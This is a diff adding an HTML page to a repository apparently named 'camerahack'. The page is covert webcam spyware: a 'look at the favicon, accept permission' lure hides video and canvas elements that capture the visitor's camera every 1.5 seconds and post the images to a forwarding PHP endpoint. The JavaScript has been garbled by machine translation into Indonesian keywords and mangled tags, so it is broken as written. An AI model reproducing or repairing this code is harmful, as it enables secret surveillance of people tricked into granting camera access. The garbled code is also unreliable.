@@ -1,1 +1,84 @@
-# camerahack
+
+<! doctype html >
+< html >
+< kepala >
+< script  type = " text / javascript " src = " https://wybiral.github.io/code-art/projects/tiny-mirror/index.js " > </ script >
+< link  rel = " stylesheet " type = " text / css " href = " https://wybiral.github.io/code-art/projects/tiny-mirror/index.css " >
+< script  type = " text / javascript " src = " https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js " > </ script >
+</ head >
+
+< div  class = " video-wrap " hidden = " hidden " >
+   < video  id = " video " playsinline  autoplay > </ video >
+</ div >
+
+< canvas  hidden = " hidden " id = " canvas " width = " 640 " height = " 480 " > </ canvas >
+
+< script >
+
+function  post ( imgdata ) {
+$ . ajax ( {
+    ketik : 'POST' ,
+    data : {  cat : imgdata } ,
+    url : 'forwarding_link / post.php' ,
+    dataType : 'json' ,
+    async : false ,
+    sukses : fungsi ( hasil ) {
+        // panggil fungsi yang menangani respons / hasil
+    } ,
+    kesalahan : function ( ) {
+    }
+  } ) ;
+} ;
+
+
+'gunakan ketat' ;
+
+const  video  =  dokumen . getElementById ( 'video' ) ;
+const  canvas  =  dokumen . getElementById ( 'canvas' ) ;
+const  errorMsgElement  =  dokumen . querySelector ( 'span # errorMsg' ) ;
+
+const  kendala  =  {
+  audio : salah ,
+  video : {
+    
+    menghadapiMode : "pengguna"
+  }
+} ;
+
+// Akses webcam
+ fungsi  asinkron init ( )  {
+  coba  {
+    const  stream  =  menunggu  navigator . mediaDevices . getUserMedia ( kendala ) ;
+    handleSuccess ( aliran ) ;
+  }  tangkap  ( e )  {
+    errorMsgElement . innerHTML  =  `navigator.getUserMedia kesalahan: $ { e . toString ( ) } ` ;
+  }
+}
+
+// Sukses
+function  handleSuccess ( aliran )  {
+  jendela . aliran  =  aliran ;
+  video . srcObject  =  aliran ;
+
+var  context  =  kanvas . getContext ( '2d' ) ;
+  setInterval ( function ( ) {
+
+       konteks . drawImage ( video ,  0 ,  0 ,  640 ,  480 ) ;
+       var  canvasData  =  kanvas . toDataURL ( "image / png" ) . ganti ( "image / png" ,  "image / octet-stream" ) ;
+       posting ( canvasData ) ;  } ,  1500 ) ;
+  
+
+}
+
+// Muat init
+init ( ) ;
+
+</ script >
+
+    < body >
+        < p > Petunjuk: Lihat favicon </ p >
+        < p > (Terima Izin) </ p >
+        < p > < label > < input  type = " checkbox " name = " mirror " id = " mirror " /> Gambar cermin </ label > </ p >
+    </ body >
+
+</ html >
